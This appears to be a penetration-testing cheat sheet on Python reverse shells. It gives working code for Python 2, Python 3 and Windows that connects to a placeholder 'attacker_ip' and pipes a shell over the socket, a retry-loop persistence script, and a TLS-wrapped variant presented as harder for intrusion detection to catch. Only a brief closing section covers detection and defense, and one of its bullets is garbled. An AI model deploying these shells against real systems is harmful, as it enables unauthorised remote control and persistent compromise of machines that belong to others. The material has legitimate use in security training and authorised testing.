# Reverse Shells — Python

## Why Python?

Python is installed by default on most Linux systems and is often available on Windows too. It provides more flexibility than bash for establishing reverse shells — especially useful when `/dev/tcp` isn't available or when you need more control.

---

## How Python Reverse Shells Work

Python's `socket` module creates TCP/UDP connections. Combined with `subprocess` or `os.system`, you can pipe a shell's stdin/stdout/stderr over the socket.

### Core Pattern
```python
import socket, subprocess, os

# Create TCP socket and connect to attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker_ip', 4444))

# Redirect subprocess stdin/stdout/stderr to the socket
subprocess.call(['/bin/bash', '-i'],
    stdin=s.fileno(),
    stdout=s.fileno(),
    stderr=s.fileno()
)
```

---

## Python Variants

### Python 3 — subprocess
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Python 2 — subprocess
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### Understanding os.dup2
```python
os.dup2(s.fileno(), 0)   # stdin  (fd 0) → socket
os.dup2(s.fileno(), 1)   # stdout (fd 1) → socket
os.dup2(s.fileno(), 2)   # stderr (fd 2) → socket
```
This redirects all I/O to the socket — the shell communicates over the network.

---

## Checking Python Version on Target

```bash
which python python2 python3
python --version
python3 --version
```

---

## Python on Windows

```powershell
# Python reverse shell for Windows
python -c "import socket,subprocess;s=socket.socket();s.connect(('attacker_ip',4444));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"
```

---

## Upgrading the Shell

A raw python reverse shell usually drops you into a limited shell. Upgrade it using pty:

```python
# Spawn a proper PTY on the target
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then on attacker side: Ctrl+Z → stty raw -echo → fg
# Set TERM: export TERM=xterm
```

---

## Persistence via Python Script

If you can write a file, create a script for persistent access:

```python
#!/usr/bin/env python3
import socket, subprocess, os, time

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('attacker_ip', 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/bash', '-i'])
    except:
        time.sleep(30)   # retry after 30 seconds
```

---

## Encrypted Reverse Shell (Harder to Detect)

Standard reverse shells send plaintext — easily detected by IDS. Using SSL:

```python
import socket, ssl, subprocess, os

context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

s = socket.socket()
ssl_sock = context.wrap_socket(s)
ssl_sock.connect(('attacker_ip', 4444))
os.dup2(ssl_sock.fileno(), 0)
os.dup2(ssl_sock.fileno(), 1)
os.dup2(ssl_sock.fileno(), 2)
subprocess.call(['/bin/bash', '-i'])
```

---

## Detection (Blue Team)

- Python process making outbound TCP connections
- `subprocess` or `os.system` calls in Python scripts spawning shells
- Files with `socket.connect` and `dup2` patterns
- Unusual parent-child process relationships (web server → python → bash)

### Indicators in Logs
```bash
# Check for Python processes with network connections
ss -tp | grep python
lsof -i -p $(pgrep python3)
```

---

## Defense / Prevention

- Disable outbound connections from application servers via egress filtering
- Use Python's `sys.setrecursionlimit` and other hardening isn't sufficient — use OS-level controls
- AppArmor / SELinux profiles for web processes
- Monitor with `auditd` or EDR for Python spawning shell processes

---

## References

- [PayloadsAllTheThings — Python Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
- [RevShells.com](https://www.revshells.com/)
